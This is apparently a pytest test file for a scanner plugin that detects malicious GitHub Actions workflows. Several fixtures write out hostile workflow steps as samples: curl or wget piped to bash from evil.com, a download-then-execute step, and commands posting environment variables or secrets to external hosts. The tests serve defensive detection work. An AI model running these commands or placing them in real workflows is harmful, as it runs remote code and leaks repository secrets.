"""Tests for GitHub Actions plugin."""

import json
import pytest
from pathlib import Path

from dev_trust_scanner.plugins.github_actions import GitHubActionsPlugin
from dev_trust_scanner.core.models import Severity


class TestGitHubActionsPlugin:
    """Test GitHub Actions plugin functionality."""

    @pytest.fixture
    def plugin(self):
        """Create plugin instance."""
        return GitHubActionsPlugin()

    def test_plugin_metadata(self, plugin):
        """Test plugin metadata."""
        metadata = plugin.get_metadata()
        assert metadata["name"] == "github_actions"
        assert "version" in metadata

    def test_plugin_supported_files(self, plugin):
        """Test supported file patterns."""
        patterns = plugin.get_supported_files()
        assert ".github/workflows/*.yml" in patterns
        assert ".github/workflows/*.yaml" in patterns

    def test_rules_loaded(self, plugin):
        """Test that rules are loaded."""
        assert len(plugin.rules) > 0

    def test_scan_malicious_workflow_filename(self, plugin, tmp_path):
        """Test GHA-001: Known malicious workflow filename/content."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "suspicious.yml"
        workflow.write_text("""
name: shai-hulud-workflow
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "test"
""")

        findings = plugin.scan(tmp_path)
        assert len(findings) > 0
        assert any(f.rule_id == "GHA-001" for f in findings)

    def test_scan_curl_pipe_bash(self, plugin, tmp_path):
        """Test GHA-003: External script download and execution."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "ci.yml"
        workflow.write_text("""
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.com/script.sh | bash
""")

        findings = plugin.scan(tmp_path)
        assert len(findings) > 0
        assert any(f.rule_id == "GHA-003" for f in findings)

    def test_scan_env_variable_dumping(self, plugin, tmp_path):
        """Test GHA-004: Environment variable dumping."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "exfil.yml"
        workflow.write_text("""
name: Exfiltration
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: printenv | curl -X POST https://webhook.site/xyz
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-004" for f in findings)

    def test_scan_self_hosted_runner(self, plugin, tmp_path):
        """Test GHA-005: Self-hosted runner detection."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "runner.yml"
        workflow.write_text("""
name: Self-hosted
on: push
jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: echo "test"
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-005" for f in findings)

    def test_scan_legitimate_workflow_no_findings(self, plugin, tmp_path):
        """Test that legitimate workflows don't trigger false positives."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "ci.yml"
        workflow.write_text("""
name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install dependencies
        run: npm install
      - name: Run tests
        run: npm test
""")

        findings = plugin.scan(tmp_path)
        # Should have no high/critical findings
        critical_or_high = [f for f in findings if f.severity in [Severity.CRITICAL, Severity.HIGH]]
        assert len(critical_or_high) == 0

    def test_scan_no_workflows_directory(self, plugin, tmp_path):
        """Test scanning directory without .github/workflows."""
        findings = plugin.scan(tmp_path)
        assert findings == []

    def test_scan_malformed_yaml(self, plugin, tmp_path):
        """Test graceful handling of malformed YAML."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "broken.yml"
        workflow.write_text("{ this is: [not valid: yaml")

        # Should not crash
        findings = plugin.scan(tmp_path)
        # May or may not have findings depending on match_rules behavior

    def test_scan_suspicious_triggers_persistence(self, plugin, tmp_path):
        """Test GHA-002: Suspicious workflow triggers pattern."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "persist.yml"
        workflow.write_text("""
name: Persistence
on:
  workflow_dispatch:
  schedule:
    - cron: '0 0 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "test"
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-002" for f in findings)

    def test_scan_wget_pipe_bash(self, plugin, tmp_path):
        """Test GHA-003: wget pipe bash variant."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "malicious.yml"
        workflow.write_text("""
name: Malicious
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: wget https://evil.com/script.sh | sh
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-003" for f in findings)

    def test_scan_curl_output_exec(self, plugin, tmp_path):
        """Test GHA-003: curl with output followed by execution."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "malicious2.yml"
        workflow.write_text("""
name: Malicious2
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o malware.sh https://evil.com/script.sh && bash malware.sh
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-003" for f in findings)

    def test_scan_github_token_usage(self, plugin, tmp_path):
        """Test GHA-004: GITHUB_TOKEN usage."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "token.yml"
        workflow.write_text("""
name: Token Usage
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo $GITHUB_TOKEN | base64
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-004" for f in findings)

    def test_scan_secrets_access(self, plugin, tmp_path):
        """Test GHA-004: secrets access."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "secrets.yml"
        workflow.write_text("""
name: Secrets
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST https://evil.com -d "${{ secrets.API_KEY }}"
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-004" for f in findings)

    def test_scan_multiple_workflows(self, plugin, tmp_path):
        """Test scanning multiple workflow files."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        # Clean workflow
        clean = workflows_dir / "clean.yml"
        clean.write_text("""
name: Clean
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
""")

        # Malicious workflow
        malicious = workflows_dir / "malicious.yml"
        malicious.write_text("""
name: Malicious
on: push
jobs:
  bad:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.com/script.sh | bash
""")

        findings = plugin.scan(tmp_path)
        # Should only find issues in malicious workflow
        assert len(findings) > 0
        # All findings should be from malicious.yml or have legitimate concerns
        malicious_findings = [f for f in findings if "malicious.yml" in str(f.file_path)]
        assert len(malicious_findings) > 0

    def test_scan_yaml_extension(self, plugin, tmp_path):
        """Test that .yaml extension is also scanned."""
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)

        workflow = workflows_dir / "test.yaml"  # Note: .yaml not .yml
        workflow.write_text("""
name: Test
on: push
jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: echo "test"
""")

        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "GHA-005" for f in findings)

    def test_all_rules_can_fire(self, plugin):
        """Test that all defined rules are valid and can trigger."""
        # Verify we have at least 5 rules (GHA-001 through GHA-005)
        assert len(plugin.rules) >= 5

        # Verify all rules have required fields
        for rule in plugin.rules:
            assert rule.id
            assert rule.name
            assert rule.severity
            assert rule.description
            assert rule.recommendation
